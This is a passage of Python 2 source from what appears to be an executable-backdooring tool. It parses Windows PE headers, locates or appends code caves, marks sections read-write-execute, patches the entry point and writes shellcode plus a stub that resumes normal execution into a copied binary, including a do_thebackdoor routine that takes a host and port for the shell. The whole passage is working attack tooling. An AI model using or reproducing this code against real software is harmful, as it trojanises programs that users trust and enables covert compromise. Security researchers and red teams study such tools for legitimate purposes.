    This section of code imports the flItms['ImpList'] from pe32_entry_instr
    to patch the executable after shellcode execution
    """

    print "[*] Creating win32 resume execution stub"
    resumeExe = ''
    for item in flItms['ImpList']:
        OpCode_address = item[0]
        OpCode = item[1].keys()[0]
        instruction = item[1].values()[0]
        ImpValue = item[2]
        instr_length = item[4]
        if verbose is True:
            if instruction:
                print 'instruction', hex(instruction)
            else:
                print "single opcode, no instruction"

        compliment_one, compliment_two = ones_compliment()

        if OpCode == int('e8', 16):  # Call instruction
            # Let's beat ASLR :D
            resumeExe += "\xb8"
            if flItms['LastCaveAddress'] == 0:
                flItms['LastCaveAddress'] = flItms['JMPtoCodeAddress']
            aprox_loc_wo_alsr = (flItms['VrtStrtngPnt'] +
                                 #The last cave starting point
                                 #flItms['JMPtoCodeAddress'] +
                                 flItms['LastCaveAddress'] +
                                 len(flItms['shellcode']) + len(resumeExe) +
                                 500 + flItms['buffer'])
            resumeExe += struct.pack("<I", aprox_loc_wo_alsr)
            resumeExe += struct.pack('=B', int('E8', 16))  # call
            resumeExe += "\x00" * 4
            # POP ECX to find location
            resumeExe += struct.pack('=B', int('59', 16))
            resumeExe += "\x2b\xc1"  # sub eax,ecx
            resumeExe += "\x3d\x00\x05\x00\x00"  # cmp eax,500
            resumeExe += "\x77\x12"  # JA (14)
            resumeExe += "\x83\xC1\x15"  # ADD ECX, 15
            resumeExe += "\x51"
            resumeExe += "\xb8"  # Mov EAX ..
            call_addr = (flItms['VrtStrtngPnt'] +
                         instruction)

            if call_addr > 4294967295:
                resumeExe += struct.pack('<I', call_addr - 0xffffffff - 1)
            else:
                resumeExe += struct.pack('<I', call_addr)
            resumeExe += "\xff\xe0"  # JMP EAX
            resumeExe += "\xb8"  # ADD
            resumeExe += struct.pack('<I', item[3])
            resumeExe += "\x50\xc3"  # PUSH EAX,RETN
            resumeExe += "\x8b\xf0"
            resumeExe += "\x8b\xc2"
            resumeExe += "\xb9"
            #had to add - 5 to this below
            resumeExe += struct.pack("<I", flItms['VrtStrtngPnt'] - 5)
            resumeExe += "\x2b\xc1"
            resumeExe += "\x05"
            resumeExe += struct.pack('<I', item[3])
            resumeExe += "\x50"
            resumeExe += "\x05"
            resumeExe += struct.pack('<I', instruction)
            resumeExe += "\x50"
            resumeExe += "\x33\xc9"
            resumeExe += "\x8b\xc6"
            resumeExe += "\x81\xe6"
            resumeExe += compliment_one
            resumeExe += "\x81\xe6"
            resumeExe += compliment_two
            resumeExe += "\xc3"
            ReturnTrackingAddress = item[3]
            return ReturnTrackingAddress, resumeExe

        elif OpCode in jump_codes:
            #Let's beat ASLR
            resumeExe += "\xb8"
            aprox_loc_wo_alsr = (flItms['VrtStrtngPnt'] +
                                 #flItms['JMPtoCodeAddress'] +
                                 flItms['LastCaveAddress'] +
                                 len(flItms['shellcode']) + len(resumeExe) +
                                 200 + flItms['buffer'])
            resumeExe += struct.pack("<I", aprox_loc_wo_alsr)
            resumeExe += struct.pack('=B', int('E8', 16))  # call
            resumeExe += "\x00" * 4
            # POP ECX to find location
            resumeExe += struct.pack('=B', int('59', 16))
            resumeExe += "\x2b\xc1"  # sub eax,ecx
            resumeExe += "\x3d\x00\x05\x00\x00"  # cmp eax,500
            resumeExe += "\x77\x0b"  # JA (14)
            resumeExe += "\x83\xC1\x16"
            resumeExe += "\x51"
            resumeExe += "\xb8"  # Mov EAX ..

            if OpCode is int('ea', 16):  # jmp far
                resumeExe += struct.pack('<BBBBBB', ImpValue)
            elif ImpValue > 429467295:
                resumeExe += struct.pack('<I', abs(ImpValue - 0xffffffff + 2))
            else:
                resumeExe += struct.pack('<I', ImpValue)  # Add+ EAX,CallV
            resumeExe += "\x50\xc3"
            resumeExe += "\x8b\xf0"
            resumeExe += "\x8b\xc2"
            resumeExe += "\xb9"
            resumeExe += struct.pack('<I', flItms['VrtStrtngPnt'] - 5)
            resumeExe += "\x2b\xc1"
            resumeExe += "\x05"
            if OpCode is int('ea', 16):  # jmp far
                resumeExe += struct.pack('<BBBBBB', ImpValue)
            elif ImpValue > 429467295:
                resumeExe += struct.pack('<I', abs(ImpValue - 0xffffffff + 2))
            else:
                resumeExe += struct.pack('<I', ImpValue - 2)
            resumeExe += "\x50"
            resumeExe += "\x33\xc9"
            resumeExe += "\x8b\xc6"
            resumeExe += "\x81\xe6"
            resumeExe += compliment_one
            resumeExe += "\x81\xe6"
            resumeExe += compliment_two
            resumeExe += "\xc3"
            ReturnTrackingAddress = item[3]
            return ReturnTrackingAddress, resumeExe

        elif instr_length == 7:
            resumeExe += opcode_return(OpCode, instr_length)
            resumeExe += struct.pack("<BBBBBBB", instruction)
            ReturnTrackingAddress = item[3]

        elif instr_length == 6:
            resumeExe += opcode_return(OpCode, instr_length)
            resumeExe += struct.pack("<BBBBBB", instruction)
            ReturnTrackingAddress = item[3]

        elif instr_length == 5:
            resumeExe += opcode_return(OpCode, instr_length)
            resumeExe += struct.pack("<BBBBB", instruction)
            ReturnTrackingAddress = item[3]

        elif instr_length == 4:
            resumeExe += opcode_return(OpCode, instr_length)
            resumeExe += struct.pack("<I", instruction)
            ReturnTrackingAddress = item[3]

        elif instr_length == 3:
            resumeExe += opcode_return(OpCode, instr_length)
            resumeExe += struct.pack("<BBB", instruction)
            ReturnTrackingAddress = item[3]

        elif instr_length == 2:
            resumeExe += opcode_return(OpCode, instr_length)
            resumeExe += struct.pack("<H", instruction)
            ReturnTrackingAddress = item[3]

        elif instr_length == 1:
            resumeExe += opcode_return(OpCode, instr_length)
            resumeExe += struct.pack("<B", instruction)
            ReturnTrackingAddress = item[3]

        elif instr_length == 0:
            resumeExe += opcode_return(OpCode, instr_length)
            ReturnTrackingAddress = item[3]

    resumeExe += "\x25"
    resumeExe += compliment_one  # zero out EAX
    resumeExe += "\x25"
    resumeExe += compliment_two  # zero out EAX
    resumeExe += "\x05"  # ADD
    resumeExe += struct.pack('=i', ReturnTrackingAddress)
    resumeExe += "\x50"  # push eax
    resumeExe += "\x25"  # zero out EAX
    resumeExe += compliment_one
    resumeExe += "\x25"  # zero out EAX
    resumeExe += compliment_two
    resumeExe += "\xC3"
    return ReturnTrackingAddress, resumeExe


def gather_file_info_win(flItms, filename, LocOfEntryinCode_Offset):
    """
    Gathers necessary PE header information to backdoor
    a file and returns a dict of file information called flItms
    """
    #To do:
    #   verify signed vs unsigned
    #   map all headers
    #   map offset once the magic field is determined of 32+/32

    s = f.seek(int('3C', 16))
    print "[*] Gathering file info"
    flItms['filename'] = filename
    flItms['buffer'] = 0
    flItms['JMPtoCodeAddress'] = 0
    flItms['LocOfEntryinCode_Offset'] = LocOfEntryinCode_Offset
    #---!!!! This will need to change for x64 !!!!
    #not so sure now..
    flItms['dis_frm_pehdrs_sectble'] = 248
    flItms['pe_header_location'] = struct.unpack('<i', f.read(4))[0]
    # Start of COFF
    flItms['COFF_Start'] = flItms['pe_header_location'] + 4
    f.seek(flItms['COFF_Start'])
    flItms['MachineType'] = struct.unpack('<H', f.read(2))[0]
    for mactype, name in MachineTypes.iteritems():
        if int(mactype, 16) == flItms['MachineType']:
            if verbose is True:
                print 'MachineType is:', name
    #f.seek(flItms['ImportTableLocation'])
    #flItms['IATLocInCode'] = struct.unpack('<I', f.read(4))[0]
    f.seek(flItms['COFF_Start'] + 2, 0)
    flItms['NumberOfSections'] = struct.unpack('<H', f.read(2))[0]
    flItms['TimeDateStamp'] = struct.unpack('<I', f.read(4))[0]
    f.seek(flItms['COFF_Start'] + 16, 0)
    flItms['SizeOfOptionalHeader'] = struct.unpack('<H', f.read(2))[0]
    flItms['Characteristics'] = struct.unpack('<H', f.read(2))[0]
    #End of COFF
    flItms['OptionalHeader_start'] = flItms['COFF_Start'] + 20
    if flItms['SizeOfOptionalHeader']:
        #Begin Standard Fields section of Optional Header
        f.seek(flItms['OptionalHeader_start'])
        flItms['Magic'] = struct.unpack('<H', f.read(2))[0]
        flItms['MajorLinkerVersion'] = struct.unpack("!B", f.read(1))[0]
        flItms['MinorLinkerVersion'] = struct.unpack("!B", f.read(1))[0]
        flItms['SizeOfCode'] = struct.unpack("<I", f.read(4))[0]
        flItms['SizeOfInitializedData'] = struct.unpack("<I", f.read(4))[0]
        flItms['SizeOfUninitializedData'] = struct.unpack("<i",
                                                          f.read(4))[0]
        flItms['AddressOfEntryPoint'] = struct.unpack('<I', f.read(4))[0]
        flItms['BaseOfCode'] = struct.unpack('<i', f.read(4))[0]
        #print 'Magic', flItms['Magic']
        if flItms['Magic'] != int('20B', 16):
            #print 'Not 0x20B!'
            flItms['BaseOfData'] = struct.unpack('<i', f.read(4))[0]
        # End Standard Fields section of Optional Header
        # Begin Windows-Specific Fields of Optional Header
        if flItms['Magic'] == int('20B', 16):
            #print 'x64!'
            flItms['ImageBase'] = struct.unpack('<Q', f.read(8))[0]
        else:
            flItms['ImageBase'] = struct.unpack('<I', f.read(4))[0]
        #print 'flItms[ImageBase]', hex(flItms['ImageBase'])
        flItms['SectionAlignment'] = struct.unpack('<I', f.read(4))[0]
        flItms['FileAlignment'] = struct.unpack('<I', f.read(4))[0]
        flItms['MajorOperatingSystemVersion'] = struct.unpack('<H',
                                                              f.read(2))[0]
        flItms['MinorOperatingSystemVersion'] = struct.unpack('<H',
                                                              f.read(2))[0]
        flItms['MajorImageVersion'] = struct.unpack('<H', f.read(2))[0]
        flItms['MinorImageVersion'] = struct.unpack('<H', f.read(2))[0]
        flItms['MajorSubsystemVersion'] = struct.unpack('<H', f.read(2))[0]
        flItms['MinorSubsystemVersion'] = struct.unpack('<H', f.read(2))[0]
        flItms['Win32VersionValue'] = struct.unpack('<I', f.read(4))[0]
        flItms['SizeOfImageLoc'] = f.tell()
        flItms['SizeOfImage'] = struct.unpack('<I', f.read(4))[0]
        #print "size of img", flItms['SizeOfImage']
        flItms['SizeOfHeaders'] = struct.unpack('<I', f.read(4))[0]
        flItms['CheckSum'] = struct.unpack('<I', f.read(4))[0]
        flItms['Subsystem'] = struct.unpack('<H', f.read(2))[0]
        flItms['DllCharacteristics'] = struct.unpack('<H', f.read(2))[0]
        if flItms['Magic'] == int('20B', 16):
            flItms['SizeOfStackReserve'] = struct.unpack('<Q', f.read(8))[0]
            flItms['SizeOfStackCommit'] = struct.unpack('<Q', f.read(8))[0]
            flItms['SizeOfHeapReserve'] = struct.unpack('<Q', f.read(8))[0]
            flItms['SizeOfHeapCommit'] = struct.unpack('<Q', f.read(8))[0]

        else:
            flItms['SizeOfStackReserve'] = struct.unpack('<I', f.read(4))[0]
            flItms['SizeOfStackCommit'] = struct.unpack('<I', f.read(4))[0]
            flItms['SizeOfHeapReserve'] = struct.unpack('<I', f.read(4))[0]
            flItms['SizeOfHeapCommit'] = struct.unpack('<I', f.read(4))[0]
        flItms['LoaderFlags'] = struct.unpack('<I', f.read(4))[0]  # zero
        flItms['NumberofRvaAndSizes'] = struct.unpack('<I', f.read(4))[0]
        # End Windows-Specific Fields of Optional Header
        # Begin Data Directories of Optional Header
        flItms['ExportTable'] = struct.unpack('<Q', f.read(8))[0]
        flItms['ImportTable'] = struct.unpack('<Q', f.read(8))[0]
        flItms['ResourceTable'] = struct.unpack('<Q', f.read(8))[0]
        flItms['ExceptionTable'] = struct.unpack('<Q', f.read(8))[0]
        flItms['CertificateTable'] = struct.unpack('<Q', f.read(8))[0]
        flItms['BaseReLocationTable'] = struct.unpack('<Q', f.read(8))[0]
        flItms['Debug'] = struct.unpack('<Q', f.read(8))[0]
        flItms['Architecutre'] = struct.unpack('<Q', f.read(8))[0]  # zero
        flItms['GlobalPrt'] = struct.unpack('<Q', f.read(8))[0]
        flItms['TLS Table'] = struct.unpack('<Q', f.read(8))[0]
        flItms['LoadConfigTable'] = struct.unpack('<Q', f.read(8))[0]
        flItms['ImportTableLocation'] = f.tell()
        #print 'ImportTableLocation', hex(flItms['ImportTableLocation'])
        flItms['BoundImport'] = struct.unpack('<Q', f.read(8))[0]
        f.seek(flItms['ImportTableLocation'])
        flItms['IATLocInCode'] = struct.unpack('<I', f.read(4))[0]
        #print 'first IATLOCIN CODE', hex(flItms['IATLocInCode'])
        flItms['IATSize'] = struct.unpack('<I', f.read(4))[0]
        #print 'IATSize', hex(flItms['IATSize'])
        flItms['IAT'] = struct.unpack('<Q', f.read(8))[0]
        flItms['DelayImportDesc'] = struct.unpack('<Q', f.read(8))[0]
        flItms['CLRRuntimeHeader'] = struct.unpack('<Q', f.read(8))[0]
        flItms['Reserved'] = struct.unpack('<Q', f.read(8))[0]  # zero
        flItms['BeginSections'] = f.tell()

    flItms['Sections'] = []
    for section in range(flItms['NumberOfSections']):
        sectionValues = []
        sectionValues.append(f.read(8))
        # VirtualSize
        sectionValues.append(struct.unpack('<I', f.read(4))[0])
        # VirtualAddress
        sectionValues.append(struct.unpack('<I', f.read(4))[0])
        # SizeOfRawData
        sectionValues.append(struct.unpack('<I', f.read(4))[0])
        # PointerToRawData
        sectionValues.append(struct.unpack('<I', f.read(4))[0])
        # PointerToRelocations
        sectionValues.append(struct.unpack('<I', f.read(4))[0])
        # PointerToLinenumbers
        sectionValues.append(struct.unpack('<I', f.read(4))[0])
        # NumberOfRelocations
        sectionValues.append(struct.unpack('<H', f.read(2))[0])
        # NumberOfLinenumbers
        sectionValues.append(struct.unpack('<H', f.read(2))[0])
        # SectionFlags
        sectionValues.append(struct.unpack('<I', f.read(4))[0])
        flItms['Sections'].append(sectionValues)
        if 'UPX'.lower() in sectionValues[0].lower():
            print "UPX files not supported."
            return False
        if ('.text\x00\x00\x00' == sectionValues[0] or
           'AUTO\x00\x00\x00\x00' == sectionValues[0] or
           'CODE\x00\x00\x00\x00' == sectionValues[0]):
            flItms['textSectionName'] = sectionValues[0]
            flItms['textVirtualAddress'] = sectionValues[2]
            flItms['textPointerToRawData'] = sectionValues[4]
        elif '.rsrc\x00\x00\x00' == sectionValues[0]:
            flItms['rsrcSectionName'] = sectionValues[0]
            flItms['rsrcVirtualAddress'] = sectionValues[2]
            flItms['rsrcSizeRawData'] = sectionValues[3]
            flItms['rsrcPointerToRawData'] = sectionValues[4]
    flItms['VirtualAddress'] = flItms['SizeOfImage']
    
    flItms['LocOfEntryinCode'] = (flItms['AddressOfEntryPoint'] -
                                  flItms['textVirtualAddress'] +
                                  flItms['textPointerToRawData'] +
                                  flItms['LocOfEntryinCode_Offset'])

    flItms['VrtStrtngPnt'] = (flItms['AddressOfEntryPoint'] +
                              flItms['ImageBase'])
    f.seek(flItms['IATLocInCode'])
    flItms['ImportTableALL'] = f.read(flItms['IATSize'])
    flItms['NewIATLoc'] = flItms['IATLocInCode'] + 40
    return flItms

def print_flItms(flItms):

    keys = flItms.keys()
    keys.sort()
    for item in keys:
        if type(flItms[item]) == int:
            print item + ':', hex(flItms[item])
        elif item == 'Sections':
            print "-" * 50
            for section in flItms['Sections']:
                print "Section Name", section[0]
                print "Virutal Size", hex(section[1])
                print "Virtual Address", hex(section[2])
                print "SizeOfRawData", hex(section[3])
                print "PointerToRawData", hex(section[4])
                print "PointerToRelocations", hex(section[5])
                print "PointerToLinenumbers", hex(section[6])
                print "NumberOfRelocations", hex(section[7])
                print "NumberOfLinenumbers", hex(section[8])
                print "SectionFlags", hex(section[9])
                print "-" * 50
        else:
            print item + ':', flItms[item]
    print "*" * 50, "END flItms"


def change_section_flags(flItms, section):
    """
    Changes the user selected section to RWE for successful execution
    """
    print "[*] Changing Section Flags"
    flItms['newSectionFlags'] = int('e00000e0', 16)
    f.seek(flItms['BeginSections'], 0)
    for _ in range(flItms['NumberOfSections']):
        sec_name = f.read(8)
        if section in sec_name:
            f.seek(28, 1)
            f.write(struct.pack('<I', flItms['newSectionFlags']))
            return
        else:
            f.seek(32, 1)


def create_code_cave(flItms, nsection):
    """
    This function creates a code cave for shellcode to hide,
    takes in the dict from gather_file_info_win function and
    writes to the file and returns flItms
    """
    print "[*] Creating Code Cave"
    flItms['NewSectionSize'] = len(flItms['shellcode']) + 250  # bytes
    flItms['SectionName'] = nsection  # less than 7 chars
    flItms['filesize'] = os.stat(flItms['filename']).st_size
    flItms['newSectionPointerToRawData'] = flItms['filesize']
    flItms['VirtualSize'] = int(str(flItms['NewSectionSize']), 16)
    flItms['SizeOfRawData'] = flItms['VirtualSize']
    flItms['NewSectionName'] = "." + flItms['SectionName']
    flItms['newSectionFlags'] = int('e00000e0', 16)
    f.seek(flItms['pe_header_location'] + 6, 0)
    f.write(struct.pack('<h', flItms['NumberOfSections'] + 1))
    f.seek(flItms['SizeOfImageLoc'], 0)
    flItms['NewSizeOfImage'] = (flItms['VirtualSize'] +
                                flItms['SizeOfImage'])
    f.write(struct.pack('<I', flItms['NewSizeOfImage']))
    f.seek(flItms['ImportTableLocation'])
    if flItms['IATLocInCode'] != 0:
        f.write(struct.pack('=i', flItms['IATLocInCode'] + 40))
    f.seek(flItms['BeginSections'] +
           40 * flItms['NumberOfSections'], 0)
    f.write(flItms['NewSectionName'] +
            "\x00" * (8 - len(flItms['NewSectionName'])))
    f.write(struct.pack('<I', flItms['VirtualSize']))
    f.write(struct.pack('<I', flItms['SizeOfImage']))
    f.write(struct.pack('<I', flItms['SizeOfRawData']))
    f.write(struct.pack('<I', flItms['newSectionPointerToRawData']))
    if verbose is True:
        print 'New Section PointerToRawData'
        print flItms['newSectionPointerToRawData']
    f.write(struct.pack('<I', 0))
    f.write(struct.pack('<I', 0))
    f.write(struct.pack('<I', 0))
    f.write(struct.pack('<I', flItms['newSectionFlags']))
    f.write(flItms['ImportTableALL'])
    f.seek(flItms['filesize'] + 1, 0)  # moving to end of file
    nop = choice(nops)
    if nop > 144:
        f.write(struct.pack('!H', nop) * (flItms['VirtualSize'] / 2))
    else:
        f.write(struct.pack('!B', nop) * (flItms['VirtualSize']))
    flItms['CodeCaveVirtualAddress'] = (flItms['SizeOfImage'] +
                                        flItms['ImageBase'])
    flItms['buffer'] = int('200', 16)  # bytes
    flItms['JMPtoCodeAddress'] = (flItms['CodeCaveVirtualAddress'] -
                                  flItms['AddressOfEntryPoint'] -
                                  flItms['ImageBase'] - 5 +
                                  flItms['buffer'])
    return flItms


def find_all_caves(flItms, shellcode_length):
    """
    This function finds all the codecaves in a inputed file.
    Prints results to screen
    """

    print "[*] Looking for caves"
    SIZE_CAVE_TO_FIND = shellcode_length
    BeginCave = 0
    Tracking = 0
    count = 1
    caveTracker = []
    caveSpecs = []
    f = open(flItms['filename'], 'r+b')
    f.seek(0)
    while True:
        try:
            s = struct.unpack("<b", f.read(1))[0]
        except:
            break
        if s == 0:
            if count == 1:
                BeginCave = Tracking
            count += 1
        else:
            if count >= SIZE_CAVE_TO_FIND:
                caveSpecs.append(BeginCave)
                caveSpecs.append(Tracking)
                caveTracker.append(caveSpecs)
            count = 1
            caveSpecs = []

        Tracking += 1

    for caves in caveTracker:

        countOfSections = 0
        for section in flItms['Sections']:
            sectionFound = False
            if caves[0] >= section[4] and caves[1] <= (section[3] + section[4]) and \
                caves[1] - caves[0] >= SIZE_CAVE_TO_FIND:
                print "We have a winner:", section[0]
                print '->Begin Cave', hex(caves[0])
                print '->End of Cave', hex(caves[1])
                print 'Size of Cave (int)', caves[1] - caves[0]
                print 'SizeOfRawData', hex(section[3])
                print 'PointerToRawData', hex(section[4])
                print 'End of Raw Data:', hex(section[3] + section[4])
                JMPtoCodeAddress = (section[2] + caves[0] -
                                    section[4] - 5 -
                                    flItms['AddressOfEntryPoint'])
                print '*' * 50
                sectionFound = True
                break
        if sectionFound is False:
            try:
                print "No section"
                print '->Begin Cave', hex(caves[0])
                print '->End of Cave', hex(caves[1])
                print 'Size of Cave (int)', caves[1] - caves[0]
                print '*' * 50
            except Exception as e:
                print str(e)
    print "[*] Total of %s caves found" % len(caveTracker)


def find_cave(flItms, shellcode_length, resumeExe):
    """This function finds all code caves, allowing the user
    to pick the cave for injecting shellcode."""

    len_allshells = ()
    if flItms['cave_jumping'] is True:
        for item in flItms['allshells']:
            len_allshells += (len(item), )
        len_allshells += (len(resumeExe), )
        SIZE_CAVE_TO_FIND = sorted(len_allshells)[0]
    else:
        SIZE_CAVE_TO_FIND = shellcode_length
        len_allshells = (shellcode_length, )

    print "[*] Looking for caves that will fit the minimum "\
          "shellcode length of %s" % SIZE_CAVE_TO_FIND
    print "[*] All caves lengths: ", len_allshells
    Tracking = 0
    count = 1
    #BeginCave=0
    caveTracker = []
    caveSpecs = []

    f.seek(0)

    while True:
        try:
            s = struct.unpack("<b", f.read(1))[0]
        except:
            break
        if s == 0:
            if count == 1:
                BeginCave = Tracking
            count += 1
        else:
            if count >= SIZE_CAVE_TO_FIND:
                caveSpecs.append(BeginCave)
                caveSpecs.append(Tracking)
                caveTracker.append(caveSpecs)
            count = 1
            caveSpecs = []

        Tracking += 1

    pickACave = {}

    for i, caves in enumerate(caveTracker):
        i += 1
        countOfSections = 0
        for section in flItms['Sections']:
            sectionFound = False
            try:
                if caves[0] >= section[4] and \
                   caves[1] <= (section[3] + section[4]) and \
                   caves[1] - caves[0] >= SIZE_CAVE_TO_FIND:
                    if verbose is True:
                        print "Inserting code in this section:", section[0]
                        print '->Begin Cave', hex(caves[0])
                        print '->End of Cave', hex(caves[1])
                        print 'Size of Cave (int)', caves[1] - caves[0]
                        print 'SizeOfRawData', hex(section[3])
                        print 'PointerToRawData', hex(section[4])
                        print 'End of Raw Data:', hex(section[3] + section[4])
                        print '*' * 50
                    JMPtoCodeAddress = (section[2] + caves[0] - section[4] -
                                        5 - flItms['AddressOfEntryPoint'])

                    sectionFound = True
                    pickACave[i] = [section[0], hex(caves[0]), hex(caves[1]),
                                    caves[1] - caves[0], hex(section[4]),
                                    hex(section[3] + section[4]), JMPtoCodeAddress]
                    break
            except:
                print "-End of File Found.."
                break
            if sectionFound is False:
                if verbose is True:
                    print "No section"
                    print '->Begin Cave', hex(caves[0])
                    print '->End of Cave', hex(caves[1])
                    print 'Size of Cave (int)', caves[1] - caves[0]
                    print '*' * 50

            JMPtoCodeAddress = (section[2] + caves[0] - section[4] -
                                5 - flItms['AddressOfEntryPoint'])
            try:
                pickACave[i] = ["None", hex(caves[0]), hex(caves[1]),
                                caves[1] - caves[0], "None",
                                "None", JMPtoCodeAddress]
            except:
                print "EOF"

    print ("############################################################\n"
           "The following caves can be used to inject code and possibly\n"
           "continue execution.\n"
           "**Don't like what you see? Use jump, single, or append.**\n"
           "############################################################")

    CavesPicked = {}

    for k, item in enumerate(len_allshells):
        print "[*] Cave {0} length as int: {1}".format(k + 1, item)
        print "[*] Available caves: "

        for ref, details in pickACave.iteritems():
            if details[3] >= item:
                print str(ref) + ".", ("Section Name: {0}; Section Begin: {4} "
                                       "End: {5}; Cave begin: {1} End: {2}; "
                                       "Cave Size: {3}".format(details[0], details[1], details[2],
                                                               details[3], details[4], details[5],
                                                               details[6]))

        while True:
            print "*" * 50
            selection = raw_input("[!] Enter your selection: ")
            try:
                selection = int(selection)
                print "Using selection: %s" % selection
                try:
                    if change_access is True:
                        if pickACave[selection][0] != "None":
                            change_section_flags(flItms,
                                                 pickACave[selection][0])
                    CavesPicked[k] = pickACave[selection]
                    break
                except Exception as e:
                    print str(e)
                    print "-User selection beyond the bounds of available caves...appending a code cave"
                    return None
            except Exception as e:
                if selection.lower() == 'append' or selection.lower() == 'jump' or selection.lower() == 'single':
                    return selection
    return CavesPicked


def runas_admin(flItms):
    """
    This module jumps to .rsrc section and checks for
    the following string: requestedExecutionLevel level="highestAvailable"

    """
    g = open(flItms['filename'], "rb")
    runas_admin = False
    if 'rsrcPointerToRawData' in flItms:
        g.seek(flItms['rsrcPointerToRawData'], 0)
        search_lngth = len('requestedExecutionLevel level="highestAvailable"')
        data_read = 0
        while data_read < flItms['rsrcSizeRawData']:
            g.seek(flItms['rsrcPointerToRawData'] + data_read, 0)
            temp_data = g.read(search_lngth)
            if temp_data == 'requestedExecutionLevel level="highestAvailable"':
                runas_admin = True
                break
            data_read += 1
    g.close()

    return runas_admin


def support_check(filename, LocOfEntryinCode_Offset):
    """
    This function is for checking if the current exe/dll is
    supported by this program. Returns false if not supported,
    returns flItms if it is.
    """
    print "[*] Checking if binary is supported"
    global flItms
    flItms = {}
    flItms['supported'] = False
    global f
    f = open(filename, "rb")
    if f.read(2) != "\x4d\x5a":
        print "%s not a PE File" % filename
        return False
    flItms = gather_file_info_win(flItms, filename, LocOfEntryinCode_Offset)
    if flItms is False:
        return False
    if MachineTypes[hex(flItms['MachineType'])] not in supported_types:
        for item in flItms:
            print item + ':', flItms[item]
        print ("This program does not support this format: %s"
               % MachineTypes[hex(flItms['MachineType'])])
    else:
        flItms['supported'] = True
    if flItms['Magic'] == int('20B', 16):
        flItms, flItms['count_bytes'] = pe64_entry_instr(flItms)
    elif flItms['Magic'] == int('10b', 16):
        flItms, flItms['count_bytes'] = pe32_entry_instr(flItms)
    else:
        flItms['supported'] = False
    flItms['runas_admin'] = runas_admin(flItms)

    f.close()

    if verbose is True:
        print_flItms(flItms)

    if flItms['supported'] is False:
        return False
    else:
        return flItms


def do_thebackdoor(filename, backdoorfile, SHELL,
                   nsection, LocOfEntryinCode_Offset,
                   NewCodeCave, cave_jumping,
                   port, host, supplied_shellcode):
    """
    This function operates the sequence of all involved
    functions to perform the binary patching.
    """
    print "[*] In the backdoor module"
    if options.INJECTOR is False:
        os_name = os.name
        if not os.path.exists("backdoored"):
            os.makedirs("backdoored")
        if os_name == 'nt':
            backdoorfile = "backdoored\\" + backdoorfile
        else:
            backdoorfile = "backdoored/" + backdoorfile

    flItms = support_check(filename, LocOfEntryinCode_Offset)
    if flItms is False:
        return None
    flItms['NewCodeCave'] = NewCodeCave
    flItms['cave_jumping'] = cave_jumping
    flItms['CavesPicked'] = {}
    flItms['LastCaveAddress'] = 0
    flItms['stager'] = False
    flItms['supplied_shellcode'] = supplied_shellcode
    if flItms['supplied_shellcode'] is not None:
        flItms['supplied_shellcode'] = open(supplied_shellcode, 'r+b').read()
        #override other settings
        port = 4444
        host = '127.0.0.1'
    set_shells(flItms, SHELL, port, host)
    #Move shellcode check here not before this is executed.
    #Creating file to backdoor
    flItms['backdoorfile'] = backdoorfile
    shutil.copy2(filename, flItms['backdoorfile'])
    global f
    f = open(flItms['backdoorfile'], "r+b")
    #reserve space for shellcode

    # Finding the length of the resume Exe shellcode
    if flItms['Magic'] == int('20B', 16):
        _, tempResumeExe = resume_execution_64(flItms)
    else:
        _, tempResumeExe = resume_execution_32(flItms)

    shellcode_length = len(flItms['shellcode'])

    flItms['shellcode_length'] = shellcode_length + len(tempResumeExe)

    caves_set = False
    while caves_set is False:

        if flItms['NewCodeCave'] is False:
            #flItms['JMPtoCodeAddress'], flItms['CodeCaveLOC'] = (
            flItms['CavesPicked'] = (
                find_cave(flItms, flItms['shellcode_length'], tempResumeExe))
            if flItms['CavesPicked'] is None:
                flItms['JMPtoCodeAddress'] = None
                flItms['CodeCaveLOC'] = 0
                flItms['cave_jumping'] = False
                flItms['CavesPicked'] = {}
                print "-resetting shells"
                set_shells(flItms, SHELL, port, host)
                caves_set = True
            elif type(flItms['CavesPicked']) == str:
                if flItms['CavesPicked'].lower() == 'append':
                    flItms['JMPtoCodeAddress'] = None
                    flItms['CodeCaveLOC'] = 0
                    flItms['cave_jumping'] = False
                    flItms['CavesPicked'] = {}
                    print "-resetting shells"
                    set_shells(flItms, SHELL, port, host)
                    caves_set = True
                elif flItms['CavesPicked'].lower() == 'jump':
                    flItms['JMPtoCodeAddress'] = None
                    flItms['CodeCaveLOC'] = 0
                    flItms['cave_jumping'] = True
                    flItms['CavesPicked'] = {}
                    print "-resetting shells"
                    set_shells(flItms, SHELL, port, host)
                    continue
                elif flItms['CavesPicked'].lower() == 'single':
                    flItms['JMPtoCodeAddress'] = None
                    flItms['CodeCaveLOC'] = 0
                    flItms['cave_jumping'] = False
                    flItms['CavesPicked'] = {}
                    print "-resetting shells"
                    set_shells(flItms, SHELL, port, host)
                    continue
            else:
                flItms['JMPtoCodeAddress'] = flItms['CavesPicked'].iteritems().next()[1][6]
                caves_set = True
        else:
            caves_set = True

    #If no cave found, continue to create one.
    if flItms['JMPtoCodeAddress'] is None or flItms['NewCodeCave'] is True:
        flItms = create_code_cave(flItms, nsection)
        flItms['NewCodeCave'] = True
        print "- Adding a new section to the exe/dll for shellcode injection"
    else:
        flItms['LastCaveAddress'] = flItms['CavesPicked'][len(flItms['CavesPicked']) - 1][6]

    #Patch the entry point
    patch_initial_instructions(flItms)

    if flItms['Magic'] == int('20B', 16):
        ReturnTrackingAddress, flItms['resumeExe'] = resume_execution_64(flItms)
    else:
        ReturnTrackingAddress, flItms['resumeExe'] = resume_execution_32(flItms)

    #write instructions and shellcode
    flItms['allshells'] = getattr(flItms['shells'], SHELL)(flItms, flItms['CavesPicked'])
    if flItms['cave_jumping'] is True:
        if flItms['stager'] is False:
            temp_jmp = "\xe9"
            test_length = int(flItms['CavesPicked'][2][1], 16) - int(flItms['CavesPicked'][1][1], 16) - len(flItms['allshells'][1]) - 5
            breakupvar = eat_code_caves(flItms['CavesPicked'], 1, 2)
            if test_length < 0:
                temp_jmp += struct.pack("<I", 0xffffffff - abs(breakupvar - len(flItms['allshells'][1]) - 4))
            else:
                temp_jmp += struct.pack("<I", breakupvar - len(flItms['allshells'][1]) - 5)

        flItms['allshells'] += (flItms['resumeExe'], )

    flItms['completeShellcode'] = flItms['shellcode'] + flItms['resumeExe']
    if flItms['NewCodeCave'] is True:
        f.seek(flItms['newSectionPointerToRawData'] + flItms['buffer'])
        f.write(flItms['completeShellcode'])
    if flItms['cave_jumping'] is True:
        for i, item in flItms['CavesPicked'].iteritems():
            f.seek(int(flItms['CavesPicked'][i][1], 16))
            f.write(flItms['allshells'][i])
            #So we can jump to our resumeExe shellcode
